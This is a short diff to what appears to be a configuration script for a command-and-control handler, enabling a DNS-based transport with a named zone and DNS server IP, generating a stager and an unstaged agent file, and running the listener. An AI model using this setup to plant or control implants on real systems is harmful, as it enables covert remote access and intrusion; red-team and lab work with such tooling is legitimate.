@@ -23,7 +23,7 @@ handler.setoption("TRANSPORT", "DNS")
 #handler.setoption("AGENTTYPE", "DNSCAT2")
 #handler.setoption("AGENTTYPE", "DNSCAT2DOWNLOADER")
 handler.setoption("ZONE", "zfs.sy.gs")
-#handler.setoption("DNSSERVER", "10.201.1.83")
+handler.setoption("DNSSERVER", "10.201.1.83")
 #handler.setoption("DNSTYPE", "A")
 
 #handler.setoption("TRANSPORT", "TCP")
@@ -37,8 +37,8 @@ handler.setoption("ZONE", "zfs.sy.gs")
 
 handler.generatestager()
 
-#handler.setoption("STAGED", "FALSE")
-#handler.generateagent("/tmp/agentfile.txt")
+handler.setoption("STAGED", "FALSE")
+handler.generateagent("/tmp/agentfile.txt")
 
 handler.run()
 
